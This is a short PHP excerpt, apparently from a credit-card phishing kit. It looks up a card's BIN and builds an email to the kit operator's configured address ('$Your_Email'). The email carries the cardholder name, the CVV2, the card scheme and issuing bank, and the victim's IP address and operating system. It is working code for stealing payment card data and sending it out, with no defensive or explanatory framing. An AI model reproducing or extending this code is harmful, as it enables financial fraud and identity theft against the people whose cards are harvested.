...
$xBIN = json_decode($resp, true);
    ...
    $subj = "" . $ccname . " - ". $bon ." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["bank"]["name"])." [ " . $VictimInfo6 . " $ip " . $systemInfo['os'] . "]";
    $to = $Your_Email;
    ...
    Cvv2              :  $secode
    BIN/IIN Info      :  ". $bon ." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["bank"]["name"])."
